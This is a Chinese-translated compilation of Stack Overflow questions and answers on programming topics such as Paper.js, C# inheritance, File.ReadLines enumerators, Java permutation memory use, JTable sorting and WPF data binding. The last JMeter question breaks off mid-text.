*   Zoom.js 是我想在其中隔离缩放功能的脚本。它使用 jq.mobi 来捕获鼠标的滚轮，因为 Paper.js 似乎没有该事件。然后它将其转换为对 onMouseScroll 的调用，类似于 Paper 的做法。

到现在为止还挺好。实际问题出现在 zoom.js 中的`zoomIn`and函数上。`zoomOut`

如果我明确使用纸张对象来引用我想要缩放的视图，它会起作用：

```
function zoomIn()
{
  if (paper.view.zoom < 2)
  {
    paper.view.zoom = paper.view.zoom * 2;
  }
} 
```

但是当我删除`paper`并仅引用视图时它会失败：

```
function zoomIn()
{
  if (view.zoom < 2)
  {
    view.zoom = view.zoom * 2;
  }
} 
```

这让我感到惊讶，因为我预计脚本是 Paperscript，在 Paperscope 中运行。如果我将此代码放在 Maps.js 中，它工作正常，所以看起来虽然 zoom.js 是由 Paper.js 加载的（浏览器中的开发人员工具确认了这一点），但它并没有在 Paperscope 中运行。

我的问题是：我的发现正确吗？难道我做错了什么？将 Paper.js 应用程序划分为多个单元以提高可读性的正确方法是什么？

当然我可以让它运行，但我想确保我做对了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T11:04:40.873

这确实是它的工作原理。我[在 GitHub 上打开了一个问题](https://github.com/paperjs/paper.js/issues/153)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-20T08:45:07.367

我发现“最干净”的方法是使用 this.install(window)。它还使使用 Chrome 开发人员工具更容易发现错误，因为它比“paperscript”更适合报告 java-script 中的行错误。

在 index.html 中（例如）：

```
<script type="text/javascript" src='js/other_lib.js'></script>

<script type="text/paperscript" canvas="canvas">
this.install(window);
/*no code 'required' here */
</script>
<body>
    <canvas id="canvas" width="1500" height="500"></canvas>
</body> 
```

然后在 js/other_lib.js 我只是像往常一样添加代码：

```
var r = new Path.Rectangle([100,100],[200,200]);
r.fillColor = 'black';
/*more code here*/ 
```

这应该生成一个矩形。

什么对我不起作用（截至 Paper.js v0.10.2 发布日期：2016 年 7 月 9 日）是对象运算符。例如为`pointc = pointa + pointb;`我添加 vecrots，这给出了很多 NaN 值。我必须编辑一些库才能使其正常工作，但更改很简单：

`var pointc = new Point(pointa.x+pointb.x,pointa.y + pointb.y);`

# nhibernate - 如何使用 NHibernate 保存 DTO？

> ID：14039556
> 
> 赞同：0
> 
> 时间：2012-12-26T10:51:48.013
> 
> 标签：nhibernate, dto, nhibernate-projections

我想做的事：

1.  使用投影获取 DTO
2.  在 UI 中我编辑这个 DTO 对象
3.  保存修改的对象

如何保存 DTO 对象？我应该重新查询域并将其合并到 dto 吗？是否有可能指定储蓄的预测？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:44:37.710

```
Should I requery domain and merge it dto? 
```

是的。这几乎就是你需要做的。NHibernate 不知道如何处理您的 DTO，因此所有持久化对象的会话方法都不适用于您的 DTO。

```
Is there a possibility to specify projections for saving? 
```

不。唯一的“储蓄预测”在实体的 NH 映射中。

# php - Solr 在 multiValue 字段中返回每个文档的每个值

> ID：14039561
> 
> 赞同：1
> 
> 时间：2012-12-26T10:52:11.227
> 
> 标签：php, solr

我是 Solr 的新手，我想知道下一个示例是否可行。

假设我有一个包含 2 个字段的核心，一个字符串字段“名称”和一个多值字段“ID”。使用文档 1：

*   姓名：蒂姆
*   编号：1,2,3

和文档 2：

*   姓名：鲍勃
*   编号：2,3

现在我想要一个查询，它给我一个包含以下元素的结果数组：

*   1 蒂姆
*   2鲍勃
*   2 蒂姆
*   3 鲍勃
*   3 蒂姆

因此，查询返回 multiValue 字段中每个值的每个文档，首先按 'ids' 中的值排序，然后按名称排序。

您可以说，只需选择所有文档并在查询后处理其他内容，但我有很多数据，我只希望前 20 个文档在 multiValued 字段中按值排序。

我希望这是可能的，有人可以帮助我！提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:18:24.177

如果您希望多次返回文档并对两个字段进行排序，您可以为每个组合插入单独的记录。
这是大量的数据重复，但假设这是您实现它的唯一方法。
您可以使用[分组](http://wiki.apache.org/solr/FieldCollapsing)功能，但它不适用于多值字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:13:03.000

我对 solr 不太了解，但
我认为通过**SolrPhpClient**你可以这样做：

```
 $arr1 = explode(":","Name: Tim");
 $arr2 = explode(":","Ids: 1,2,3");
 $arr2 = explode(",",$arr2[1]);

 for($i=0;$i<$arr2.length;$i++){
 array_push( $arr3 ,array( $arr2[i] ,arr1[1] ) );
 } 
```

对第二个做同样的事情
，通过 array_merge 和排序你可以获得想要的结果。

# objective-c - 根据时长将视频分成两部分

> ID：14039564
> 
> 赞同：0
> 
> 时间：2012-12-26T10:52:34.320
> 
> 标签：objective-c, video, ios6, ios5

我有一个应用程序，我需要将一个视频分成两部分，然后将一个部分与另一个视频连接起来。

你们中的任何人都可以告诉我如何根据持续时间将视频分成两部分。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:13:57.180

您可以使用[AVFoundation 类并通过](http://developer.apple.com/library/ios/#DOCUMENTATION/AudioVideo/Conceptual/AVFoundationPG/Articles/01_UsingAssets.html#//apple_ref/doc/uid/TP40010188-CH7-SW8)[UIVideoEditor 类](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIVideoEditorController_ClassReference/Reference/Reference.html)检查视频的可编辑性

# c# - 如何获取基类的“新”参数？

> ID：14039567
> 
> 赞同：1
> 
> 时间：2012-12-26T10:52:55.860
> 
> 标签：c#, inheritance

我正在从这样的无参数构造函数类派生一个类：

```
public class Base
{
    public Base(Panel panel1)
    {

    }
}

public class Derived : Base
{
    public Derived() : base(new Panel())
    {
        //How do I use panel1 here?
    }
} 
```

如何在 Derived 中引用 panel1？

（欢迎使用简单的解决方法。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T10:57:37.630

Adil 的回答假设您可以修改`Base`. 如果你不能，你可以这样做：

```
public class Derived : Base
{
    private Panel _panel;

    public Derived() : this(new Panel()) {}

    private Derived(Panel panel1) : base(panel1)
    {
        _panel = panel1;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:54:29.930

您需要定义`Panel`in `Base`，也可以使用**protected**代替`public`。[**在此处**](http://msdn.microsoft.com/en-us/library/ms173121.aspx)阅读有关访问说明符的更多信息[](http://msdn.microsoft.com/en-us/library/ms173121.aspx)

 **```
public class Base
{
    public Panel panel {get; set;};
    public Base(Panel panel1)
    {
         panel = panel1;
    }
}

public class Derived : Base
{
    public Derived() : base(new Panel())
    {
          //  this.panel
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:56:56.433

两种方式：

```
public class Derived : Base
{
    Panel aPanel;

    public Derived() : this(new Panel()) {}

    public Derived(Panel panel) : base(aPanel)
    {
        //Use aPanel Here.
    }
} 
```

或者

```
public class Base
{
    protected Panel aPanel;

    public Base(Panel panel1)
    {
        aPanel = panel1
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:57:11.127

```
public class Base
{
    // Protected to ensure that only the derived class can access the _panel attribute
    protected Panel _panel;
    public Base(Panel panel1)
    {
        _panel = panel1;
    }
}

public class Derived : Base
{
    public Derived() : base(new Panel())
    {
        // refer this way: base.panel
    }
} 
```

此外，如果您只想为派生类提供 get 而不是 set，您可以这样做：

```
 public class Base
    {
        // Protected to ensure that only the derived class can access the _panel attribute
        private Panel _panel;
        public Base(Panel panel1)
        {
            _panel = panel1;
        }

        protected Panel Panel
        {  get { return _panel; } } 
    }

    public class Derived : Base
    {
        public Derived() : base(new Panel())
        {
            // refer this way: base.Panel (can only get)
        }
    } 
```**

# c++ - 获取嵌套向量 C++ 中的特定元素

> ID：14039569
> 
> 赞同：3
> 
> 时间：2012-12-26T10:53:01.987
> 
> 标签：c++

我有一个嵌套的字符串向量，例如：

```
std::vector<std::vector<string>> 
```

我想访问内部向量的八个元素，它本身就是外部向量的第二个元素。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:54:42.173

就像使用二维数组一样：

```
std::vector<std::vector<std::string>> vec;
// Fill it
std::cout << vec[1][7] << std::endl; 
```

如果要进行边界检查，请使用`std::vector::at`：

```
std::cout << vec.at(1).at(7) << std::endl; 
```

请注意，索引是 1 和 7，因为索引从 0 开始。

# c# - 为什么 IEumerator 影响 IEnumerable 的状态 甚至枚举器也没有到达终点？

> ID：14039571
> 
> 赞同：11
> 
> 时间：2012-12-26T10:53:06.593
> 
> 标签：c#, ienumerable, ienumerator, textreader

我很好奇为什么以下会在“最后”分配中引发错误消息（文本阅读器关闭异常）：

```
IEnumerable<string> textRows = File.ReadLines(sourceTextFileName);
IEnumerator<string> textEnumerator = textRows.GetEnumerator();

string first = textRows.First();
string last = textRows.Last(); 
```

但是以下执行正常：

```
IEnumerable<string> textRows = File.ReadLines(sourceTextFileName);

string first = textRows.First();
string last = textRows.Last();

IEnumerator<string> textEnumerator = textRows.GetEnumerator(); 
```

不同行为的原因是什么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-26T11:11:32.840

据我所知，您在框架中发现了一个错误。由于一些事情的相互作用，它相当微妙：

*   当您调用 时`ReadLines()`，该文件实际上已打开。就个人而言，我认为这本身就是一个错误。我希望并希望它会很懒惰-仅在您尝试开始对其进行迭代时才打开文件。
*   当您*第*`GetEnumerator()`一次调用的返回值时，它实际上将返回相同的引用。*`ReadLines`*
**   `First()`调用时`GetEnumerator()`，它将创建一个克隆。这将共享相同`StreamReader`的`textEnumerator`*   当`First()`处置其克隆时，它将处置`StreamReader`，并将*其*变量设置为`null`。这不会影响原始变量中的变量，它现在指的是已处置的`StreamReader`*   `Last()`调用时`GetEnumerator()`，它将创建*原始对象*的克隆，并带有 dispose `StreamReader`。然后它会尝试从该阅读器读取数据，并引发异常。*

 *现在将其与您的第二个版本进行比较：

*   `First()`调用时`GetEnumerator()`，返回原始引用，并带有打开的阅读器。
*   当`First()`then 调用`Dispose()`时，读取器将被释放并将变量设置为`null`
*   `Last()`调用时`GetEnumerator()`，将创建一个克隆 - 但因为它正在克隆的值有一个`null`引用，`StreamReader`所以会创建一个新的，因此它能够毫无问题地读取文件。然后它处理克隆，关闭阅读器
*   当`GetEnumerator()`被调用时，原始对象的第二个克隆，打开另一个`StreamReader`- 再次，那里没有问题。

所以基本上，第一个片段中的问题是你在没有处理第一个对象的情况下`GetEnumerator()`第二次调用（in ）。`First()`

这是同一问题的另一个示例：

```
using System;
using System.IO;
using System.Linq;

class Test
{
    static void Main()
    {
        var lines = File.ReadLines("test.txt");
        var query = from x in lines
                    from y in lines
                    select x + "/" + y;
        foreach (var line in query)
        {
            Console.WriteLine(line);
        }
    }
} 
```

您可以通过调用`File.ReadLines`两次来解决此问题 - 或使用真正惰性的 实现`ReadLines`，如下所示：

```
using System.IO;
using System.Linq;

class Test
{
    static void Main()
    {
        var lines = ReadLines("test.txt");
        var query = from x in lines
                    from y in lines
                    select x + "/" + y;
        foreach (var line in query)
        {
            Console.WriteLine(line);
        }
    }

    static IEnumerable<string> ReadLines(string file)
    {
        using (var reader = File.OpenText(file))
        {
            string line;
            while ((line = reader.ReadLine()) != null)
            {
                yield return line;
            }
        }
    }
} 
```

在后面的代码中，`StreamReader`每次`GetEnumerator()`调用时都会打开一个新的 - 所以结果是 test.txt 中的每一对行。*

# actionscript-3 - 制造障碍物

> ID：14039575
> 
> 赞同：0
> 
> 时间：2012-12-26T10:53:42.293
> 
> 标签：actionscript-3, collision-detection

我是 ActionScript 3.0 的新手，所以如果你们能帮我一点忙。

我想制造一个阻碍玩家前进的障碍物。我做了这样的事情，我将所有动作保存到数组中，而不是如果它们发生碰撞，它会将玩家移动到先前的位置。还有其他方法吗，因为我认为这不是正确的方法。有时当它发生碰撞时，玩家无法移动。你可以给我一个例子吗 ：）

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:10:44.403

这是您可以检测到碰撞的唯一方法，但以更精细的方式。

*   您实际上会碰撞物体（但尚未将更改应用于实际对象）。

*   检查舞台上的所有碰撞体。

*   采取必要的步骤（回滚，摧毁..任何东西）

*   在屏幕上应用更改并渲染身体。

考虑以上作为 flash 的示例：

```
var hero:Sprite = new Sprite();

addChild(hero);

while(1) {

   var newX = hero.x + 1; 

   if(newX < 100) 

       hero.x = newX;            
} 
```

每个游戏都应该有一个循环。循环必须分支到各种情况。这就是你的开始。

英雄对象可能会随着用户交互而移动，并且检查会不断增加，随着项目变得越来越密集，迫使您重新考虑解决方案......

# regex - Regular expression + No Empty String

> ID：14039577
> 
> 赞同：0
> 
> 时间：2012-12-26T10:53:47.143
> 
> 标签：regex, whitespace

I am using following regular expression to accept the time in 24hr format in Objective-C.

```
(^([1]?[1-9]|2[1-3])?(\\.([0-9]{1,1})?)?$) 
```

It is working perfectly, but it accepts the empty string. I **don't want it to accept the empty string.** Could you please guide?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:18:59.410

Your regex seems to be wrong because the part dealing with minutes (the second group) contains just one digit. I thing the following pattern fits better your needs

```
^(([01]?\d)|(2[0-3]))\.([0-5]\d)$ 
```

The first group deals with hours (that can be in ranges 0-19 or 20-23) and the second group deals with minutes. It doesn't accept empty strings as the groups are not optional.

# ajax - Ajax 和输出 pdf 文件不能一起工作

> ID：14039579
> 
> 赞同：0
> 
> 时间：2012-12-26T10:54:01.123
> 
> 标签：ajax, pdf

我有一个名为 download.php 的文件并在其中调用 getpdf 函数。

当用户单击下载按钮时，我通过 ajax 调用 download.php 来下载 pdf 文件。但什么也没发生，也没有出现下载窗口。我在 firebug Net 选项卡中检查了它，并且在单击事件时请求了 download.php。它的大小也会发生变化，表明文件正在从其位置读取，但没有下载窗口。

这是getpdf代码：

```
function getpdf($id) {
  header('Content-Type: application/pdf');
  readfile('/san/theo-books/PDFs/'.$id.'.pdf');
  exit;
} 
```

这是download.php代码：

```
$pdf_id = $_POST('pdi');
echo getpdf($pdf_id); 
```

问题是什么？你能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T13:51:13.017

这是完整的回发版本。它没有使用 jQuery Ajax，因为 Popup 下载窗口需要完整的回发：

```
<a id="pdf-10" href="#">PDF Export</a>

$(document).ready(function () {
    $('a[id^="pdf"]').click(function (event) {
        event.preventDefault();
        var pdfExportPath = "/san/theo-books/PDFs/";  
        var $a = $(this);
        var postId = $a.attr('id').replace("pdf-","");
        var form = $('<form action="' + pdfExportPath + '" name="pdf' + postId + '" id="pdf' + postId + '" method="POST"> <input id="id" name="id" type="hidden" value="' + postId + '" /></form>');
        $(form).appendTo('body');
        form.submit();
    });
}); 
```

# java - java排列生成算法中的奇怪错误

> ID：14039580
> 
> 赞同：0
> 
> 时间：2012-12-26T10:54:04.377
> 
> 标签：java, runtime-error, permutation

我的算法生成数字 0...n 的排列，其中 n 可以是 1 到 9 之间的任何数字。它适用于从 1 到 8 的数字。但是当我使用 9 运行它时，它会运行一段时间。然后突然中止进程并退出......没有错误消息或任何类似的东西！我在java中编码已经有一段时间了，从来没有遇到过这个错误。

我的算法：-

```
package utils;

import java.util.ArrayList;

class Lexicography {

    static ArrayList<Long> perms = new ArrayList<Long>();

    public static void main(String[] args){
        long time = System.currentTimeMillis();
        getPermutations(Integer.valueOf(args[0]));

        System.out.println("\nSize:-"+perms.size()+"\nTime:-"+(System.currentTimeMillis()-time));
        //This println is never printed... java aborts before that
    }

    public static ArrayList<Long> getPermutations(int num){
        int[] n = new int[num+1];
        for(int i=0; i<=num; i++) n[i]=i;
        perms.add(getLong(n));
        for(int i=num; i>=0; i--) permutate(n[i],n);
        return perms;
    }

    private static void permutate(int k, int[] n){
        if(k>n.length) return;
        int p=0;
        for(int i:n){ if(i==k) break; p++;}

        for(int i=0; i<n.length; i++){
            if(i==p || n[i]<k) continue;
            n=swap(p,i,n);
            perms.add(getLong(n));
            System.out.println("i:"+(i+1)+" k:"+k+"    n:"+getLong(n));//this prints all permutations till the last one and then poof!

            for(int j=k-1; j>=0; j--) permutate(j,n);
            n=swap(p,i,n);
        }
    }

    private static int[] swap(int i, int f, int[] a){
        int t=a[f];
        a[f]=a[i]; a[i]=t;
        return a;
    }

    private static long getLong(int[] n){
        long ten=1, num=0;
        for(int i=n.length-1; i>=0; i--){
            num+=n[i]*ten; ten*=10;
        }
        return num;
    }

} 
```

如果没有 print 语句，直到 8 的数字运行得非常快（对于 8，它运行在 280 毫秒以下）。但是对于 9，它在打印最后一个排列后突然停止。有人可以帮忙吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:22:24.903

问题不在于您的代码，而在于`System.out`，它无法在合理的时间内显示您提供给它的数据量，因此它会引发混乱。当我尝试运行您的应用程序时，它仍然在 6 分钟后运行，所以我取消了它，注释掉了 print 语句，然后再次运行它，这需要 2 秒（根据我的编译器）输出：

```
Size:-3628800
Time:-962 
```

因此，我更改了您的代码，改为将数据打印到文件中，然后再次运行，执行时间为 4 秒，并创建了一个漂亮的 83.1 MB 输出文本文件。这是我使用的代码（我会更改它以使用更少的静态内容）：

```
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;

class Lexicography
{
    static ArrayList<Long> perms = new ArrayList<>();
    private static BufferedWriter out;

    public static void main(String[] args) throws IOException
    {
        File outputFile = new File("output.txt");
        if(!outputFile.exists())
        {
            outputFile.createNewFile();
        }
        out = new BufferedWriter(new FileWriter(outputFile.getAbsolutePath()));
        long time = System.currentTimeMillis();
        getPermutations(Integer.valueOf("9"));
        System.out.println("\nSize:-" + perms.size() + "\nTime:-" + (System.currentTimeMillis() - time));
        out.close();
    }

    public static ArrayList<Long> getPermutations(int num) throws IOException
    {
        int[] n = new int[num + 1];
        for(int i = 0; i <= num; i++)
        {
            n[i] = i;
        }
        perms.add(getLong(n));
        for(int i = num; i >= 0; i--)
        {
            permutate(n[i], n);
        }
        return perms;
    }

    private static void permutate(int k, int[] n) throws IOException
    {
        if(k > n.length)
        {
            return;
        }
        int p = 0;
        for(int i : n)
        {
            if(i == k)
            {
                break;
            }
            p++;
        }

        for(int i = 0; i < n.length; i++)
        {
            if(i == p || n[i] < k)
            {
                continue;
            }
            n = swap(p, i, n);
            perms.add(getLong(n));
            out.write("i:" + (i + 1) + " k:" + k + "    n:" + getLong(n) + "\n");
            for(int j = k - 1; j >= 0; j--)
            {
                permutate(j, n);
            }
            n = swap(p, i, n);
        }
    }

    private static int[] swap(int i, int f, int[] a)
    {
        int t = a[f];
        a[f] = a[i];
        a[i] = t;
        return a;
    }

    private static long getLong(int[] n)
    {
        long ten = 1, num = 0;
        for(int i = n.length - 1; i >= 0; i--)
        {
            num += n[i] * ten;
            ten *= 10;
        }
        return num;
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:33:04.177

我怀疑您的 JVM 资源有限，并且您的内存量已接近极限。尝试在不打印的情况下运行，但使用`-verbosegc` 创建 a`List<Long>`会消耗分配的内存，这只有在您有足够的可用内存时才可以。

顺便说一句，我不会`-`在它们前面打印正数，因为它们看起来像负数。如果我在我的机器上运行，我会看到（不带`-`）

```
Size: 3628800
Time: 18645 
```

无需打印

```
Size: 3628800
Time: 1420 
```

和`-mx128m`

```
Size: 3628800
Time: 1894 
```

需要`-mx100m`很长时间才能抛出

```
Exception in thread "main" java.lang.OutOfMemoryError: GC overhead limit exceeded
at java.lang.Long.valueOf(Long.java:577)
at Lexicography.permutate(Lexicography.java:31)
at Lexicography.permutate(Lexicography.java:34)
at Lexicography.permutate(Lexicography.java:34)
at Lexicography.permutate(Lexicography.java:34)
at Lexicography.permutate(Lexicography.java:34)
at Lexicography.permutate(Lexicography.java:34)
at Lexicography.getPermutations(Lexicography.java:19)
at Lexicography.main(Lexicography.java:9) 
```

您将需要至少 128 MB 的堆大小才能有效地运行它。

# java - JTable中的数字排序

> ID：14039582
> 
> 赞同：0
> 
> 时间：2012-12-26T10:54:14.217
> 
> 标签：java, swing, sorting, numbers, jtable

拜托，谁能明白为什么这段代码仍然拒绝使用我的比较器？这是与 userTable 对象相关的所有代码 + 我在那里有鼠标和键侦听器，但我认为它不会影响排序。

```
private TableRowSorter trs;

public constructor() {
initComponents();
...
trs = new TableRowSorter<>(userTable.getModel());

    class IntComparator implements Comparator {

        @Override
        public int compare(Object o1, Object o2) {
            System.out.println("comparing");
            Integer int1 = (Integer) o1;
            Integer int2 = (Integer) o2;
            return int1.compareTo(int2);
        }

    }

    trs.setComparator(0, new IntComparator());
    userTable.setRowSorter(trs);
...
}

private void initComponents() {
...
userTable = new javax.swing.JTable(){
            @Override
            public TableCellRenderer getCellRenderer(int row, int column) {
                return renderer;
            }
        };
...
userTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "ID", "count", "null"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.Integer.class, java.lang.Integer.class, java.lang.Object.class
            };
            boolean[] canEdit = new boolean [] {
                false, false, false
            };

            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit [columnIndex];
            }
        });

} 
```

它一直在进行 RADIX 排序，并且从未显示过消息“比较”。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T13:36:09.070

[http://download.java.net/jdk8/docs/api/javax/swing/DefaultRowSorter.html#setComparator(int](http://download.java.net/jdk8/docs/api/javax/swing/DefaultRowSorter.html#setComparator(int) , java.util.Comparator)

1.  您可能需要调用“排序”
2.  您可能需要将“1”指定为起始列（不确定，只是预感）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-29T10:23:44.203

问题是，该表是使用 JDBS 从 DB 填充的，而我没有设置正确的数据类型。表列本身设置为整数或浮点数，但从 DB 读取的数据被视为字符串。

```
switch (rs.getMetaData().getColumnType(i + 1)) {
                        case 93: //DATE
                            rowData[i] = rs.getDate(i + 1).toString() + "> " + rs.getTime(i + 1);
                            break;
                        default:
                            rowData[i] = rs.getString(i + 1);
                            break;
                    } 
```

新代码如下所示。

```
switch (rs.getMetaData().getColumnType(i + 1)) {
                        case 93:
                            rowData[i] = rs.getDate(i + 1).toString() + "> " + rs.getTime(i + 1);
                            break;
                        case 4:
                            rowData[i] = rs.getInt(i + 1);
                            break;
                        case -5:
                            rowData[i] = rs.getLong(i + 1);
                            break;
                        case 7:
                            rowData[i] = rs.getFloat(i + 1);
                            break;
                        default:
                            rowData[i] = rs.getString(i + 1);
                            break;
                    } 
```

Jtable 具有由 netbeans 中的复选框构建的默认行排序器：D

# c# - wpf组合框数据绑定xml

> ID：14039591
> 
> 赞同：0
> 
> 时间：2012-12-26T10:55:10.203
> 
> 标签：c#, wpf, binding, combobox

我想在我的组合框中显示所有组名（contact_grname），但只显示一项！这是为什么 ？！

```
<XmlDataProvider x:Key="TeleData" XPath="/response/contacts/contact">

</XmlDataProvider>

<CollectionViewSource x:Key="TeleView"  Source="{StaticResource TeleData}" >
    <CollectionViewSource.SortDescriptions>
        <scm:SortDescription PropertyName="contact_name" Direction="Ascending" />

    </CollectionViewSource.SortDescriptions>

    <CollectionViewSource.GroupDescriptions>
        <dat:PropertyGroupDescription PropertyName="contact_grname" />

    </CollectionViewSource.GroupDescriptions>
</CollectionViewSource> 
```

```
<ComboBox ItemsSource="{Binding Source={StaticResource TeleView}, XPath=contact_grname}" /> 
```

我的 xml 文件：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<response>
    <contacts>
        <contact>
            <contact_grname>group1</contact_grname>
            <contact_name>Bart</contact_name>
        </contact>
        <contact>
            <contact_grname>group1</contact_grname>
            <contact_name>Eric</contact_name>
        </contact>
        <contact>
            <contact_grname>group2</contact_grname>
            <contact_name>Mike</contact_name>
        </contact>
    </contacts>
</response> 
```

只是 group1 出现了（一次）。当我在组合框中使用 StaticResource TeleData 而不是 TeleView 时，会显示所有组名（但有双精度值，因为没有以这种方式分组）

组合框中的预期输出：

*   组 1
*   组2

现在我有（使用 TeleView）：

*   组 1

如果我使用 Teledata：

*   组 1
*   组 1
*   组2

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T12:19:06.993

这不是您问题的答案，但它可能会有所帮助。考虑这个组合框：

```
<ComboBox SelectedIndex="1">
        <ComboBox.Resources>
            <XmlDataProvider x:Key="Data"
                             XPath="response/contacts">
                <x:XData>
                        <response>
                            <contacts>
                                <contact>
                                    <contact_grname>group1</contact_grname>
                                    <contact_name>Bart</contact_name>
                                    <contact_name>Eric</contact_name>
                                </contact>
                                <contact>
                                    <contact_grname>group2</contact_grname>
                                    <contact_name>Mike</contact_name>
                                </contact>
                            </contacts>
                        </response>
                </x:XData>
            </XmlDataProvider>
        </ComboBox.Resources>
        <ComboBox.ItemsSource>
            <Binding Source="{StaticResource Data}"
                     XPath="contact/contact_name"  />
        </ComboBox.ItemsSource>
    </ComboBox> 
```

它显示“Bart”、“Eric”和“Mike”。使用此绑定：

```
<Binding Source="{StaticResource Data}"
                     XPath="contact/contact_grname"  /> 
```

您将获得“group1”、“group2”。但这是因为我更改了 xml。对于您的 xlm，我的意思是：

```
 <contact>
    <contact_grname>group1</contact_grname>
    <contact_name>Bart</contact_name>
 </contact> 
 <contact>
    <contact_grname>group1</contact_grname>
    <contact_name>Mike</contact_name>
 </contact> 
```

结果是“group1”、“group1”和“group2”。

`/contact`因此，一个建议是从这行代码中删除：

```
<XmlDataProvider x:Key="TeleData" XPath="/response/contacts/contact"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T04:38:25.423

如果您只想显示您可以通过路径`Groups`实际访问该`CollectionViewSource.View.Groups`属性`ItemSource`

```
<ComboBox ItemsSource="{Binding Source={StaticResource TeleView}, Path=Groups}" SelectedValuePath="Name" /> 
```

输出：

*   组 1
*   组2

# c# - 如何在 ASP.Net 中使用字符串 ID 访问按钮？

> ID：14039596
> 
> 赞同：1
> 
> 时间：2012-12-26T10:55:26.963
> 
> 标签：c#, asp.net

我正在使用 Asp.Net。我有一个充满按钮的页面，每个按钮都有一个 id 示例：btn_1_1、btn_1_2 等。从代码端我有一个循环，我使用随机数将按钮的 Ids 生成为字符串，例如：“btn_1_1”、“btn_1_2” “ ETC。 。我的问题是，如何使用此字符串值访问具有相同 ID 的按钮属性？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T10:59:23.483

您可以使用[FindControl](http://msdn.microsoft.com/en-us/library/486wc64h.aspx)方法接受控件的 ID 作为字符串。

```
string id = "btn_1_1";
Button btn1 = FindControl(id) as Button;
if (btn1 != null)
{
// Manipulating button's properties
} 
```

只需确保您调用`FindControl`的是按钮的最近父级，因为此方法不会对控件树执行递归搜索。

# android - 通过 Android 运行 Python 脚本（使用外部模块）

> ID：14039598
> 
> 赞同：1
> 
> 时间：2012-12-26T10:55:46.263
> 
> 标签：android, python

我使用 SymPy（用于符号数学的 Python 库）编写了一个 Python 脚本。我想通过一个 Android 应用程序在我的 Android 设备上运行这个脚本：我希望用户与我将使用 Android SDK 开发的应用程序进行交互，但我希望由 Python 脚本完成处理。这里的问题是我在该脚本中使用了一个外部模块（SymPy）。有没有办法做到这一点？

# c# - FireFox 会话问题

> ID：14039601
> 
> 赞同：0
> 
> 时间：2012-12-26T10:56:04.040
> 
> 标签：c#, asp.net-mvc, file-upload, uploadify

我正在一个网站上工作，用户可以在其中上传文件/照片并上传我正在使用uploadify控件我正在将登录的用户ID和当前日期和年份添加到文件中然后保存它，我已将用户ID保存在会话中（ Session["userid"])，它在 IE 和 chrome 上运行良好，但是当我从 firefox 运行它时，它显示 Session["userid"]=null 并且因此它没有上传文件，下面是我上传的代码文件

```
public string UploadFile(HttpPostedFileBase fileData)
        {
            try
            {
                if (fileData != null && fileData.ContentLength > 0)
                {
                    var root = AppDomain.CurrentDomain.BaseDirectory + @"Uploads\File\";
                    var filname = fileData.FileName.Split('.')[0] + "_" + Session["userid"].ToString() + "_" + DateTime.Now.Day + DateTime.Now.Year + "." + fileData.FileName.Split('.')[1];
                    var path = root + Path.GetFileName(filname);

                    //if (System.IO.File.Exists(path))
                    //    return "Upload Failed! A file with this name already exists.";                      

                    fileData.SaveAs(path);

                    return "1";
                }
                return "file not selected.";
            }
            catch (Exception ex)
            {           
                throw ex;
            }
        } 
```

尽管用户已登录，但仍显示会话 null

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:20:22.987

也许您在 Firefox 中禁用了 cookie

# jmeter - 如何平均增加 3 个线程组中的用户数，节省它们之间的请求比例？

> ID：14039607
> 
> 赞同：1
> 
> 时间：2012-12-26T10:56:25.727
> 
> 标签：jmeter

我的测试计划中有 3 个线程组。这些线程组必须具有固定的请求权重（例如 1st-50%、2nd-40%、3rd-10%）。如果我需要模拟恒定数量的用户，如果我将循环计数设置为数字（1、10、100 等），@ **PMD UBIK-INGENIERIE**给出的[这篇文章中的解决方案](https://i.stack.imgur.com/ZuK8R.png)效果很好。但问题是当我为循环计数设置“永远”复选框时，组之间的比例被打破了。

 **现在我需要增加用户数量，节省我的 3 个组之间的请求比例，以执行容量评估。所有 3 组必须以 50-40-10 的恒定比例均匀发送请求。

如果我使用步进线程组，我可以平均增加每个用户的用户数，但我无法为他们设置请求的比例。

你能告诉我任何想法，如何做到这一点？

* * *

UPD1。

我的设置截图： ![在此处输入图像描述](../Images/71b775cc5d96e12a22e7fdcc2e250947.png)

和

![在此处输入图像描述](../Images/8f811f9a8296a9840adecc5c30aafbe5.png)

怎么了？

* * *

UPD2。最后一个变体（我为每个组手动输入了数字）是（线程组 1 - 50%）：

